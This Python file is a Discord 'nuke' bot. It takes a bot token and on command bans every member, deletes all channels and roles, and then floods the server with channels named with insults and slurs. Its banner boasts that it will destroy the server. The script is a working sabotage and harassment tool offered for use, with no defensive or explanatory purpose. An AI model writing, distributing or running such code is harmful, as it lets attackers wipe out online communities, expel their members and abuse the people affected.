
import os
from unittest import expectedFailure
import random
import discord
from discord.ext import commands
from typing import ContextManager
from colorama import init, Fore, Back
init()

print(  '''░ █▀▀░█▀▀░█▀▄░█░█░█▀▀░█▀▄░░░█▀█░█░█░█░█░█▀▀░█▀▄
  ▀▀█░█▀▀░█▀▄░▀▄▀░█▀▀░█▀▄░░░█░█░█░█░█▀▄░█▀▀░█▀▄
  ▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀ '''
     )

IMPORTANT =  "IF YOU WANT TO USE THIS PROGRAMM DONT FORGET ITS POWERFULL AND WILL DESTROY THE SERVER!!!!!!!!!!!!"
print (Fore.RED + IMPORTANT)

channels = [
    "u got hacked lol", "hahahahahahaha", "u trash as fuck hahahaha", "shit owner", "EZ", "POMOCI HAHAHAH", "SHIT SERVER","FUCK ALL OF YOU",
    "retard-mods", "imagine-being-nuked","leave this server lol!!!!!!!!!!!"
]
token_input = input(  "Please enter your Bot token:  ")
TOKEN = token_input

counting = int(input ("How many channels should be created default = 100:  "))
if counting == "":
    counting = 100


pomoci = commands.Bot(command_prefix="!", intents = discord.Intents.all())

@pomoci.command(aliases=['nuke'])
async def start(ctx):
    num = 0
    numb = 0
    
    print   (Fore.RED + '''░█▀▀░▀█▀░█▀█░█▀▄░▀█▀░█▀▀░█▀▄
 ▀▀█░░█░░█▀█░█▀▄░░█░░█▀▀░█░█
░▀▀▀░░▀░░▀░▀░▀░▀░░▀░░▀▀▀░▀▀░''')
       
    
    await ctx.message.delete()
    
    for member in ctx.guild.members:
        try: 
            await member.ban()
            numb = numb + 1
            print(Fore.RED + "Banned")
        except Exception as e:  
            print(Fore.RED + "") 
    
    
    
    
    for channel in ctx.guild.channels:
        try:  
            await channel.delete()
            print(Fore.CYAN + "Deleted")
            num = num + 1
            
        except Exception as e:
            print(Fore.CYAN + "All CHANNELS deleted")
     


    
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + "Role deleted")
        except Exception as e:
            print(Fore.MAGENTA + "")
    
    for _ in range(counting):
        await ctx.guild.create_text_channel(random.choice(channels))
        print(Fore.GREEN + "Created")
        



    
    
    print(Fore.GREEN + str(counting) + "  Channels were created!")
    print(Fore.CYAN + str(num) + Fore.CYAN + "  channels got deleted!")
    print(Fore.RED + str(numb) + Fore.RED + "  members got banned!")

    print(Fore.BLUE +'''█▀▀░▀█▀░█▀█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
█▀▀░░█░░█░█░░█░░▀▀█░█▀█░█▀▀░█░█
▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀░''')


 
    
        
      
                                                        
         
    



pomoci.run(TOKEN)

